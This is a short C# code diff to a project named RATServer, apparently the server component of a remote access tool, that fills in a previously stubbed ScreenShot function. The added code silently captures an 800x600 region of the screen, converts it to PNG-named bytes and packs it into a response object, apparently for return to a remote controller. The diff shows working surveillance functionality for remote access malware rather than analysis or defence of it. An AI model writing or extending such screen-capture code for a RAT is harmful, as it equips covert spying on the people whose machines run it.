@@ -4,6 +4,8 @@ using System.IO;
 using System.Net;
 using System.Windows.Forms;
 using System.ServiceProcess;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace RATServer
 {
@@ -148,12 +150,21 @@ namespace RATServer
         }
         public static Response ScreenShot()
         {
-            //work in progress
             Response r = new Response { Type = "Data" };
             try
             {
-                //r.Msg = filename;
-                //r.Data = data;
+                int width = 800;
+                int height = 600;
+                using (Bitmap bitmap = new Bitmap(width, height))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
+                    }
+                    r.Msg = "screenshot.png";
+                    ImageConverter converter = new ImageConverter();
+                    r.Data = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
+                }
             }
             catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
             return r;
